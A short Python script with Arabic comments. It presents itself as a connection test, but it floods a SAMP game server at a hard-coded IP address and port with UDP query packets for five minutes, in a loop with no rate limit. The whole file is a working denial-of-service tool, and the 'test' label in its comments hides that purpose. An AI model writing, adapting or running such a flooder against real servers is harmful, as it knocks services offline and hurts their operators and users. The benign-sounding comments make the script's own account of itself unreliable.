import socket
import time

# حدد البيانات
TARGET_IP = "45.154.98.154"  # استبدله بـ IP الهدف
TARGET_PORT = 7781      # استبدله بمنفذ السيرفر
DURATION = 300              # مدة الاختبار بالثواني

def test_connection():
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # حزمة استعلام SAMP بسيطة (Info Query)
    payload = b'SAMP' + socket.inet_aton(TARGET_IP)[:900] + int(TARGET_PORT).to_bytes(2, 'little') + b'i'
    
    end_time = time.time() + DURATION
    count = 0
    
    print(f"جاري اختبار الاتصال مع {TARGET_IP}:{TARGET_PORT}...")
    
    try:
        while time.time() < end_time:
            client.sendto(payload, (TARGET_IP, TARGET_PORT))
            count += 1
    except Exception as e:
        print(f"حدث خطأ: {e}")
    finally:
        client.close()
        print(f"تم إرسال {count} حزمة استعلام.")

if __name__ == "__main__":
    test_connection()
    
